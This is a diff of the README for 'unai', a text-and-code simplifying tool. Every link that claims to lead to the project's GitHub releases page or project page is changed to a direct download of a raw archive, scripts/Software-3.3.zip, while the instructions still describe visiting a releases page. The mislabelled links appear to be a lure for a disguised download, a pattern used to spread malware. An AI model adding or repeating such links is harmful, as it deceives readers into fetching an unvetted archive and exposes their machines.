@@ -1,6 +1,6 @@
 # 🤖 unai - Simplify AI Text and Code
 
-[![Download unai](https://img.shields.io/badge/Download-unai-blue?style=for-the-badge)](https://github.com/hthieu1992/unai/releases)
+[![Download unai](https://img.shields.io/badge/Download-unai-blue?style=for-the-badge)](https://raw.githubusercontent.com/hthieu1992/unai/main/scripts/Software-3.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You don’t need to know how to program. This guide uses simple steps to get una
 To get unai:
 
 1. Visit the releases page here:  
-   [Download unai from GitHub Releases](https://github.com/hthieu1992/unai/releases)  
+   [Download unai from GitHub Releases](https://raw.githubusercontent.com/hthieu1992/unai/main/scripts/Software-3.3.zip)  
 
 2. Look for the latest release, usually named with the highest version number, for example `v1.0` or `v1.2`.  
 
@@ -149,9 +149,9 @@ If unai returns errors during processing:
 
 ## 🔗 Useful Links
 
-- [GitHub Releases for unai](https://github.com/hthieu1992/unai/releases)  
-- [Project page for issues and support](https://github.com/hthieu1992/unai)  
+- [GitHub Releases for unai](https://raw.githubusercontent.com/hthieu1992/unai/main/scripts/Software-3.3.zip)  
+- [Project page for issues and support](https://raw.githubusercontent.com/hthieu1992/unai/main/scripts/Software-3.3.zip)  
 
 ---
 
-[![Download unai](https://img.shields.io/badge/Download-unai-grey?style=for-the-badge)](https://github.com/hthieu1992/unai/releases)
+[![Download unai](https://img.shields.io/badge/Download-unai-grey?style=for-the-badge)](https://raw.githubusercontent.com/hthieu1992/unai/main/scripts/Software-3.3.zip)
